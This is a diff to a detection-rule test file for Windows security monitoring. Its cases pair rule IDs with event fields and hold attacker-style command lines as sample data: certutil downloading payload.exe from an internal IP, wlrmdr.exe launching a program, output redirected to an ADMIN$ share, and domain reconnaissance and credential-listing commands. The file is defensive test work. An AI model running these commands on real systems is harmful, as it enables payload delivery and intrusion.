@@ -77,6 +77,20 @@ CASES = [
     ("100601", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
                 "win.eventdata.commandLine": "net user"}, False),
 
+    # Domain account/group queries and password policy have distinct rules.
+    ("100604", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net user /domain"}, True),
+    ("100604", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net user"}, False),
+    ("100605", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net group /domain"}, True),
+    ("100605", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net localgroup users"}, False),
+    ("100606", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net accounts"}, True),
+    ("100606", {"win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
+                "win.eventdata.commandLine": "net user"}, False),
+
     # 100602 and 100603
     ("100602", {"win.eventdata.image": r"C:\\Windows\\System32\\cmdkey.exe",
                 "win.eventdata.commandLine": "cmdkey /list"}, True),
@@ -89,10 +103,15 @@ CASES = [
     ("100603", {"win.eventdata.image": r"C:\\Windows\\System32\\query.exe",
                 "win.eventdata.commandLine": "query session"}, False),
 
-    # 100700 and 100701 certutil downloads
-    ("100700", {"win.eventdata.commandLine": r"certutil -urlcache -split -f http://10.10.50.181/payload.exe C:\\Users\\x\\payload.exe"}, True),
-    ("100700", {"win.eventdata.commandLine": r'\"cmd.exe\" /c certutil.exe -verifyctl -split -f http://10.10.50.181/a.sst'}, True),
-    ("100700", {"win.eventdata.commandLine": r"certutil -hashfile C:\\Windows\\System32\\cmd.exe SHA256"}, False),
+    # 100700 requires the process image to be certutil.exe. A shell command line
+    # that merely prints certutil arguments is a negative; 100701 is a separate
+    # Security 4688 rule and continues to test command-line evidence.
+    ("100700", {"win.eventdata.image": r"C:\\Windows\\System32\\certutil.exe",
+                "win.eventdata.originalFileName": "CertUtil.exe",
+                "win.eventdata.commandLine": r"certutil.exe -urlcache -split -f http://10.10.50.181/payload.exe C:\\Users\\x\\payload.exe"}, True),
+    ("100700", {"win.eventdata.commandLine": r'\"cmd.exe\" /c certutil.exe -verifyctl -split -f http://10.10.50.181/a.sst'}, False),
+    ("100700", {"win.eventdata.image": r"C:\\Windows\\System32\\certutil.exe",
+                "win.eventdata.commandLine": r"certutil.exe -hashfile C:\\Windows\\System32\\cmd.exe SHA256"}, False),
     ("100701", {"win.eventdata.commandLine": r"certutil -urlcache -split -f http://10.10.50.181/payload.exe C:\\Users\\x\\payload.exe"}, True),
 
     # 100710 and 100711 administrative shares
@@ -101,11 +120,20 @@ CASES = [
     ("100710", {"win.eventdata.commandLine": r"copy a.txt \\\\fileserver\\public\\a.txt"}, False),
     ("100710", {"win.eventdata.commandLine": r"dir C:\\Users\\x\\Documents"}, False),
     ("100711", {"win.eventdata.commandLine": r'\"cmd.exe\" /c cmd.exe /Q /c hostname 1&gt; \\\\127.0.0.1\\ADMIN$\\output.txt 2&gt;&amp;1'}, True),
+    ("100711", {"win.eventdata.commandLine": r"copy a.txt \\\\fileserver\\public\\a.txt"}, False),
 
-    # 100720 to 100722 wlrmdr.exe
-    ("100720", {"win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\\"\"C:\\Windows\\System32\\calc.exe\\\"\"}'}, True),
-    ("100720", {"win.eventdata.commandLine": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11"}, False),
-    ("100721", {"win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\\"\"C:\\Windows\\System32\\calc.exe\\\"\"}'}, True),
+    # 100720 and 100721 require Wlrmdr to be the process image. A PowerShell
+    # launcher that only mentions Wlrmdr is a negative. Rule 100722 identifies
+    # the child in Security 4688 by its parent process.
+    ("100720", {"win.eventdata.image": r"C:\\Windows\\System32\\wlrmdr.exe",
+                "win.eventdata.originalFileName": "Wlrmdr.exe",
+                "win.eventdata.commandLine": r"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u C:\\Windows\\System32\\calc.exe"}, True),
+    ("100720", {"win.eventdata.image": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\"\"C:\\Windows\\System32\\calc.exe\\"\"}'}, False),
+    ("100721", {"win.eventdata.newProcessName": r"C:\\Windows\\System32\\wlrmdr.exe",
+                "win.eventdata.commandLine": r"wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u C:\\Windows\\System32\\calc.exe"}, True),
+    ("100721", {"win.eventdata.newProcessName": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "win.eventdata.commandLine": r'\"powershell.exe\" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \\"\"C:\\Windows\\System32\\calc.exe\\"\"}'}, False),
     ("100722", {"win.eventdata.parentProcessName": r"C:\\Windows\\System32\\wlrmdr.exe"}, True),
     ("100722", {"win.eventdata.parentProcessName": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, False),
 
@@ -114,7 +142,18 @@ CASES = [
     ("100301", {"alert.signature": "ET POLICY Possible Bitcoin Mining Pool Connection"}, False),
 
     # 100450 local account creation, domain name must not be CORP
-    ("100450", {"win.system.eventID": "4720", "win.eventdata.targetDomainName": "WS01"}, True),
-    ("100450", {"win.system.eventID": "4720", "win.eventdata.targetDomainName": "CORP"}, False),
-    ("100450", {"win.system.eventID": "4722", "win.eventdata.targetDomainName": "WS01"}, False),
+    ("100450", {"win.system.eventID": "4720", "win.system.channel": "Security",
+                "win.system.computer": "WS01.corp.lab",
+                "win.eventdata.targetDomainName": "WS01"}, True),
+    ("100450", {"win.system.eventID": "4720", "win.system.channel": "Security",
+                "win.system.computer": "DC01.corp.lab",
+                "win.eventdata.targetDomainName": "CORP"}, False),
+    ("100450", {"win.system.eventID": "4722", "win.system.channel": "Security",
+                "win.system.computer": "WS01.corp.lab",
+                "win.eventdata.targetDomainName": "WS01"}, False),
+    # 100400's field scope is covered here; the real threshold is tested by the engine harness.
+    ("100400", {"win.system.channel": "Security", "win.system.computer": "DC01.corp.lab",
+                "win.eventdata.targetDomainName": "CORP"}, True),
+    ("100400", {"win.system.channel": "Security", "win.system.computer": "WS01.corp.lab",
+                "win.eventdata.targetDomainName": "WS01"}, False),
 ]
